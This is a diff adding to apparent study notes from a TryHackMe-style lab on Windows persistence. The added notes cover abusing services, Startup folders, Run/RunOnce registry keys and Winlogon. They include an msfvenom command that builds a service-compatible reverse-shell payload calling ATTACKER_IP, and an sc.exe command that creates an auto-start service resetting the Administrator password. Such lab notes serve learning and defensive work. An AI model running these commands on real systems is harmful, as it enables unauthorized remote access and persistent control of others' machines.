@@ -128,4 +128,47 @@ in order to change RID 500 to a local user we need to access SAM using regedit, 
 
 PsExec64.exe -i -s regedit
 
+
+ABUSING SERVICES
+
+sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto  // cerate a service THMservice and the net user command will change the administrator password -> Passwd123
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe // msfvwnom payload for rev-shell which is compatiable to windows services.
+
+ sc.exe query state=all // to list the availabe services
+
+sc.exe qc THMService3 //to query a servics configuration.
+    
+               There are three things we care about when using a service for persistence:
+                       The executable (BINARY_PATH_NAME) should point to our payload.
+                       The service START_TYPE should be automatic so that the payload runs without user interaction.
+                       The SERVICE_START_NAME, which is the account under which the service will run, should preferably                        be set to LocalSystem to gain SYSTEM privileges. 
+
+STARTUP FOLDER
+
+ C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup //executables to be run whenever the user logs in
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp // force all users to run a payload while logging in
+
+
+RUN / RunOnce
+
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+The registry entries under HKCU will only apply to the current user, and those under HKLM will apply to everyone. Any program specified under the Run keys will run every time the user logs on. Programs specified under the RunOnce keys will only be executed a single time.
+
+WINLOGON
+
+uses some registrey key under HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ 
+
+Userinit points to userinit.exe, which is in charge of restoring your user profile preferences.
+shell points to the system's shell, which is usually explorer.exe.
+
+append commands separated by a comma, and Winlogon will process them all.
+
+
+LOGON SCRIPTS
+
+
  
